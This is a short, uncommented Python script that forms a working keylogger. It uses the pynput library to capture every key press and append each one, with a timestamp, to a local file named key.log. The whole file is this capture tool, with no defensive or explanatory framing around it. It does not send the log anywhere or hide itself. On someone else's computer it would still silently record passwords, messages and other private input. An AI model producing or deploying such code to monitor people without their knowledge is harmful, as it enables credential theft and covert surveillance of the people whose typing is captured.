from pynput import keyboard
import logging

def on_press(key):
	try:
		logging.info(key)
	except AttributeError:
		print(f"special key {key} is pressed ")



logging.basicConfig(filename='key.log', filemode='a', level=logging.DEBUG,format='%(asctime)s %(message)s')


with keyboard.Listener(on_press=on_press) as listener:
	listener.join()